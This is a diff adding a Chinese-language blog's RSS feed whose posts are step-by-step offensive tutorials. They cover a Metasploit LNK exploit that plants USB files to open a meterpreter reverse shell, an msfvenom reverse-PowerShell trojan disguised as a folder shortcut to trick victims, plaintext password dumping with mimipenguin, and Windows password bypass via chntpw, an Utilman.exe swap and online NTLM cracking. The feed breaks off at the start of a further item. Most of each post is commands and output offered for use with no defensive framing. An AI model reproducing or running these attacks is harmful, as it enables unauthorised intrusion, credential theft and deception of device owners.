@@ -1,0 +1,666 @@
+<?xml version="1.0" encoding="UTF-8"?>  
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">  
+    <channel>  
+        <title></title>  
+        <description>王俊博客，软件改变世界！王俊博客是作者个人知识库、是记录历程回顾的笔记本、是经验教训的资源池， 旨在促进软件开发领域知识与创新的传播，为软件开发中提供帮助。更多是作者本人的经验积累。
+</description>  
+        <link>http://localhost:4000</link>  
+        <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />  
+          
+            <item>  
+               <title>通过U盘使用Link漏洞进行攻击</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#通过u盘使用link漏洞进行攻击&quot; id=&quot;markdown-toc-通过u盘使用link漏洞进行攻击&quot;&gt;通过U盘使用Link漏洞进行攻击&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#1-下载漏洞脚本&quot; id=&quot;markdown-toc-1-下载漏洞脚本&quot;&gt;1. 下载漏洞脚本&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#2-安装漏洞脚本&quot; id=&quot;markdown-toc-2-安装漏洞脚本&quot;&gt;2. 安装漏洞脚本&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#3-启动监听并生成文件&quot; id=&quot;markdown-toc-3-启动监听并生成文件&quot;&gt;3. 启动监听并生成文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#4-制作渗透u盘&quot; id=&quot;markdown-toc-4-制作渗透u盘&quot;&gt;4. 制作渗透U盘&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#5-触发漏洞得到shell&quot; id=&quot;markdown-toc-5-触发漏洞得到shell&quot;&gt;5. 触发漏洞得到Shell&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;通过u盘使用link漏洞进行攻击&quot;&gt;通过U盘使用Link漏洞进行攻击&lt;/h1&gt;
+
+&lt;h2 id=&quot;1-下载漏洞脚本&quot;&gt;1. 下载漏洞脚本&lt;/h2&gt;
+
+&lt;p&gt;从 &lt;strong&gt;&lt;a href=&quot;https://www.exploit-db.com&quot;&gt;exploit-db&lt;/a&gt;&lt;/strong&gt; 下载 &lt;strong&gt;LNK Remote Code Execution Vulnerability&lt;/strong&gt; 漏洞文件&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://www.exploit-db.com/download/42382.rb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;2-安装漏洞脚本&quot;&gt;2. 安装漏洞脚本&lt;/h2&gt;
+
+&lt;p&gt;安装漏洞脚本很简单，只需要将下载的ruby漏洞脚本文件放到metasploit指定目录中即可&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;42382.rb /usr/share/metasploit-framework/modules/exploits/windows/fileformat/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;3-启动监听并生成文件&quot;&gt;3. 启动监听并生成文件&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; search 42382
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/windows/fileformat/42382
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/x64/meterpreter/reverse_tcp &lt;span class=&quot;c&quot;&gt;# 注意目标是x86还是x64的&lt;/span&gt;
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;lhost 192.168.1.15
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show targets
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;target 0
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/lLbLLlpJEWOCVjXn.dll created copy it to the root folder of the target USB drive
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/attUBiQoEENCHdXj_D.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is D
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/TPIhmhvfUkHRaotP_E.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is E
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/jlhbqmicbvEDUucR_F.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is F
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/KvvqRTlZixISpRHK_G.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is G
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/FDiknQGLVXPKFBIC_H.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is H
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/gHhqXTwmxeDPlpTA_I.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is I
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/njveXscZFvRwJLFJ_J.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is J
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/nZxhpuwJHVAIUNXx_K.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is K
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/QbOVySllSZXOmglY_L.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is L
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/qQhIaawNDiMbcaqK_M.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is M
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/fSylFhAGVNNwaYnd_N.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is N
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/PQyizrKnVNCRQJkd_O.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is O
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/xfhnyJCEsOdbpnhs_P.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is P
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/oSYDiEMnouNpHFqE_Q.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is Q
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/OBlpipdrGcLVdvhd_R.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is R
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/MFxDTvxGjYarzweM_S.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is S
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/LwmuNxBWnRfWevDC_T.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is T
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/wlJlNxRBICJVLnQX_U.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is U
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/rOHsCIBWNTrXGstq_V.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is V
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/BKUZRSPKBSukmlpy_W.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is W
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/hbOvINMLAxHcWavV_X.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is X
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/FTLzXgWfeTeMuieN_Y.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is Y
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; /root/.msf4/local/JKYOcCLPNuxnHvlh_Z.lnk create, copy to the USB drive &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;drive letter is Z
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;执行上述metasploit命令后会在本地启动好监听程序，&lt;strong&gt;并在~/.msf4/local中生成多个link文件&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;4-制作渗透u盘&quot;&gt;4. 制作渗透U盘&lt;/h2&gt;
+
+&lt;p&gt;在目录 &lt;strong&gt;~/.msf4/local&lt;/strong&gt; 将生成的所有 &lt;strong&gt;Link&lt;/strong&gt; 文件拷贝到U盘的根路径中&lt;/p&gt;
+
+&lt;h2 id=&quot;5-触发漏洞得到shell&quot;&gt;5. 触发漏洞得到Shell&lt;/h2&gt;
+
+&lt;p&gt;将U盘插入目标windows机器中，打开U盘就会出发远程link漏洞，在Metasploit控制台中得到目标主机的shell&lt;/p&gt;
+</description>  
+               <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/11/u-link-remote-vulnerability/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/11/u-link-remote-vulnerability/</guid>  
+               </item>  
+          
+            <item>  
+               <title>U盘伪装快捷方式欺骗攻击</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#u盘伪装快捷方式欺骗攻击&quot; id=&quot;markdown-toc-u盘伪装快捷方式欺骗攻击&quot;&gt;U盘伪装快捷方式欺骗攻击&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#1-生成脚本木马&quot; id=&quot;markdown-toc-1-生成脚本木马&quot;&gt;1. 生成脚本木马&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#2-u盘放置木马&quot; id=&quot;markdown-toc-2-u盘放置木马&quot;&gt;2. U盘放置木马&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#3-伪装隐藏&quot; id=&quot;markdown-toc-3-伪装隐藏&quot;&gt;3. 伪装隐藏&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#4-诱骗点击&quot; id=&quot;markdown-toc-4-诱骗点击&quot;&gt;4. 诱骗点击&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;u盘伪装快捷方式欺骗攻击&quot;&gt;U盘伪装快捷方式欺骗攻击&lt;/h1&gt;
+
+&lt;h2 id=&quot;1-生成脚本木马&quot;&gt;1. 生成脚本木马&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom –p cmd/windows/reverse_powershell &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.1.15 &lt;span class=&quot;nv&quot;&gt;lport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;43221  &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; file.bat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;2-u盘放置木马&quot;&gt;2. U盘放置木马&lt;/h2&gt;
+
+&lt;p&gt;在U盘创建一个空文件夹，将木马程序放到文件夹中，并对此木马程序创建快捷方式，将快捷方式剪切到此文件夹之外。&lt;/p&gt;
+
+&lt;h2 id=&quot;3-伪装隐藏&quot;&gt;3. 伪装隐藏&lt;/h2&gt;
+
+&lt;p&gt;将快捷方式图标设置为文件夹的方式，重命名，如”18++”&lt;/p&gt;
+
+&lt;p&gt;第一步创建的文件夹设置为隐藏模式&lt;/p&gt;
+
+&lt;h2 id=&quot;4-诱骗点击&quot;&gt;4. 诱骗点击&lt;/h2&gt;
+
+&lt;p&gt;此时U盘中只会看见一个”18++”的”文件夹”，其实是伪装的脚本木马程序。&lt;/p&gt;
+</description>  
+               <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/11/u-fake-attacker/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/11/u-fake-attacker/</guid>  
+               </item>  
+          
+            <item>  
+               <title>使用mimipenguin工具在Linux系统中dump出明文密码</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#使用mimipenguin工具在linux系统中dump出明文密码&quot; id=&quot;markdown-toc-使用mimipenguin工具在linux系统中dump出明文密码&quot;&gt;使用mimipenguin工具在Linux系统中dump出明文密码&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#1-原理&quot; id=&quot;markdown-toc-1-原理&quot;&gt;1. 原理&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#3-下载&quot; id=&quot;markdown-toc-3-下载&quot;&gt;3. 下载&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#4-使用&quot; id=&quot;markdown-toc-4-使用&quot;&gt;4. 使用&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;使用mimipenguin工具在linux系统中dump出明文密码&quot;&gt;使用mimipenguin工具在Linux系统中dump出明文密码&lt;/h1&gt;
+
+&lt;h2 id=&quot;1-原理&quot;&gt;1. 原理&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;mimipenguin&lt;/strong&gt; 使用内存计算的技术，读取内存中的凭证信息，linux系统在运行中会将用户名和密码以明文的方式保存在内存中。&lt;/p&gt;
+
+&lt;h2 id=&quot;3-下载&quot;&gt;3. 下载&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/huntergregal/mimipenguin.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;4-使用&quot;&gt;4. 使用&lt;/h2&gt;
+
+&lt;p&gt;在目标机器直接运行&lt;code class=&quot;highlighter-rouge&quot;&gt;mimipenguin&lt;/code&gt;命令，如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# shell&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;u+x mimipenguin.py
+./mimipenguin.sh
+
+&lt;span class=&quot;c&quot;&gt;# python&lt;/span&gt;
+python3 ./mimipenguin.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</description>  
+               <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/11/dump-password-linux/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/11/dump-password-linux/</guid>  
+               </item>  
+          
+            <item>  
+               <title>破解windows密码的几种常用方式</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#破解windows密码的几种常用方式&quot; id=&quot;markdown-toc-破解windows密码的几种常用方式&quot;&gt;破解windows密码的几种常用方式&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#1-前提说明&quot; id=&quot;markdown-toc-1-前提说明&quot;&gt;1. 前提说明&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#2-基于ophcrack的猜解&quot; id=&quot;markdown-toc-2-基于ophcrack的猜解&quot;&gt;2. 基于Ophcrack的猜解&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#21-u盘启动&quot; id=&quot;markdown-toc-21-u盘启动&quot;&gt;2.1 U盘启动&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#22-使用ophcrack&quot; id=&quot;markdown-toc-22-使用ophcrack&quot;&gt;2.2 使用ophcrack&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#23-在线破解hashcode&quot; id=&quot;markdown-toc-23-在线破解hashcode&quot;&gt;2.3 在线破解hashcode&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#3-基于chntpw破解工具&quot; id=&quot;markdown-toc-3-基于chntpw破解工具&quot;&gt;3. 基于chntpw破解工具&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#31-u盘启动&quot; id=&quot;markdown-toc-31-u盘启动&quot;&gt;3.1 U盘启动&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#32-定位到sam目录&quot; id=&quot;markdown-toc-32-定位到sam目录&quot;&gt;3.2 定位到SAM目录&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#33-使用chntpw工具&quot; id=&quot;markdown-toc-33-使用chntpw工具&quot;&gt;3.3 使用chntpw工具&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#4-基于文件系统的替换&quot; id=&quot;markdown-toc-4-基于文件系统的替换&quot;&gt;4. 基于文件系统的替换&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#41-u盘启动&quot; id=&quot;markdown-toc-41-u盘启动&quot;&gt;4.1 U盘启动&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#42-定位到sys目录&quot; id=&quot;markdown-toc-42-定位到sys目录&quot;&gt;4.2 定位到SYS目录&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#43-替换特殊文件&quot; id=&quot;markdown-toc-43-替换特殊文件&quot;&gt;4.3 替换特殊文件&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#44-打开命令行程序&quot; id=&quot;markdown-toc-44-打开命令行程序&quot;&gt;4.4 打开命令行程序&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;破解windows密码的几种常用方式&quot;&gt;破解windows密码的几种常用方式&lt;/h1&gt;
+
+&lt;h2 id=&quot;1-前提说明&quot;&gt;1. 前提说明&lt;/h2&gt;
+
+&lt;p&gt;以下三种方式破解windows是基于 &lt;strong&gt;kali live usb&lt;/strong&gt; 的方式，即需要准备一个安装了kali系统的U盘。&lt;/p&gt;
+
+&lt;h2 id=&quot;2-基于ophcrack的猜解&quot;&gt;2. 基于Ophcrack的猜解&lt;/h2&gt;
+
+&lt;h3 id=&quot;21-u盘启动&quot;&gt;2.1 U盘启动&lt;/h3&gt;
+
+&lt;p&gt;接上安装kali系统U盘，重新引导并使用U盘系统启动&lt;/p&gt;
+
+&lt;h3 id=&quot;22-使用ophcrack&quot;&gt;2.2 使用ophcrack&lt;/h3&gt;
+
+&lt;p&gt;打开终端，输入命令&lt;code class=&quot;highlighter-rouge&quot;&gt;ophcrack&lt;/code&gt;，点击ophcrack工具栏中 &lt;strong&gt;load&lt;/strong&gt; 按钮，选择 &lt;strong&gt;Encrypted SAM&lt;/strong&gt;，此时弹出选择目录的对话框，选择windows硬盘的 ++windows/system32/config++ 目录。&lt;/p&gt;
+
+&lt;p&gt;待读取SAM数据库后会显示出windows系统的用户列表及其 &lt;strong&gt;hashcode&lt;/strong&gt; 值&lt;/p&gt;
+
+&lt;h3 id=&quot;23-在线破解hashcode&quot;&gt;2.3 在线破解hashcode&lt;/h3&gt;
+
+&lt;p&gt;将读取到的hashcode复制，粘贴到在线破解NTLM的网站中去，可用的在线破解站点有：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://hashkiller.co.uk/ntlm-decrypter.aspx&quot;&gt;https://hashkiller.co.uk/ntlm-decrypter.aspx&lt;/a&gt;
+&lt;a href=&quot;https://crackstation.net/code&quot;&gt;https://crackstation.net/code&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;3-基于chntpw破解工具&quot;&gt;3. 基于chntpw破解工具&lt;/h2&gt;
+
+&lt;h3 id=&quot;31-u盘启动&quot;&gt;3.1 U盘启动&lt;/h3&gt;
+
+&lt;p&gt;接上安装kali系统U盘，重新引导并使用U盘系统启动&lt;/p&gt;
+
+&lt;h3 id=&quot;32-定位到sam目录&quot;&gt;3.2 定位到SAM目录&lt;/h3&gt;
+
+&lt;p&gt;打开终端，&lt;code class=&quot;highlighter-rouge&quot;&gt;cd&lt;/code&gt;进入windows系统的SAM数据库目录（++windows/system32/config++ ）&lt;/p&gt;
+
+&lt;h3 id=&quot;33-使用chntpw工具&quot;&gt;3.3 使用chntpw工具&lt;/h3&gt;
+
+&lt;p&gt;在SAM目录中，输入命令&lt;code class=&quot;highlighter-rouge&quot;&gt;chntpw -l SAM&lt;/code&gt;读取windows系统用户列表，确定好用户后，输入命令&lt;code class=&quot;highlighter-rouge&quot;&gt;chntpw -u administrator SAM&lt;/code&gt;进入交互模式，选择 &lt;strong&gt;1&lt;/strong&gt; 清除目标用户密码。&lt;/p&gt;
+
+&lt;p&gt;拔出U盘，再次重新进入windows系统，此时清除的目标用户已经不需要密码即可登录。&lt;/p&gt;
+
+&lt;h2 id=&quot;4-基于文件系统的替换&quot;&gt;4. 基于文件系统的替换&lt;/h2&gt;
+
+&lt;h3 id=&quot;41-u盘启动&quot;&gt;4.1 U盘启动&lt;/h3&gt;
+
+&lt;p&gt;接上安装kali系统U盘，重新引导并使用U盘系统启动&lt;/p&gt;
+
+&lt;h3 id=&quot;42-定位到sys目录&quot;&gt;4.2 定位到SYS目录&lt;/h3&gt;
+
+&lt;p&gt;打开终端，&lt;code class=&quot;highlighter-rouge&quot;&gt;cd&lt;/code&gt;进入windows系统的System32目录（++windows/system32++）&lt;/p&gt;
+
+&lt;h3 id=&quot;43-替换特殊文件&quot;&gt;4.3 替换特殊文件&lt;/h3&gt;
+
+&lt;p&gt;使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;mv Utilman.exe Utilman.exe.bak&lt;/code&gt;将windows辅助程序进行备份，&lt;code class=&quot;highlighter-rouge&quot;&gt;cp cmd.exe Utilman.exe&lt;/code&gt;复制一个命令行程序为辅助程序的名称，拔出U盘重新启动进入window登录界面。&lt;/p&gt;
+
+&lt;h3 id=&quot;44-打开命令行程序&quot;&gt;4.4 打开命令行程序&lt;/h3&gt;
+
+&lt;p&gt;在windows登录界面右下角，点击辅助程序即可打开windows命令行程序，使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;net user&lt;/code&gt;查看当前用户，&lt;code class=&quot;highlighter-rouge&quot;&gt;net user vinny *&lt;/code&gt;创建一个不带密码的用户，重启即可进入。&lt;/p&gt;
+</description>  
+               <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/11/crack-windows-password/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/11/crack-windows-password/</guid>  
+               </item>  
+          
+            <item>  
+               <title>几种暴力破解web服务器目录的方式</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#几种暴力破解web服务器目录的方式&quot; id=&quot;markdown-toc-几种暴力破解web服务器目录的方式&quot;&gt;几种暴力破解web服务器目录的方式&lt;/a&gt;    &lt;ul&gt;
